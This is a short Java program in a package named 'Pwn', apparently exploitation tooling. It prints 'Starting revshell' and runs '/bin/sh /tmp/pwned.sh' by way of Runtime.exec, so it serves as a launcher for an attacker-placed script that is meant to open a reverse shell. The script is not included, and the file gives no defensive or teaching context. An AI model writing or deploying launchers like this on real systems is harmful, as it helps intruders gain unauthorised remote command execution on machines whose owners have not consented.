package Pwn;

public class Main
{
    public static void main(String[] args)
    {
        System.out.println("Starting revshell");
        try {
        	Runtime r = Runtime.getRuntime();
            Process p = r.exec("/bin/sh /tmp/pwned.sh");
            p.waitFor();    
            System.out.println("runned");
        } catch (Exception e){
            
            System.out.println("EXCEPTION");
        }
        
    }
}

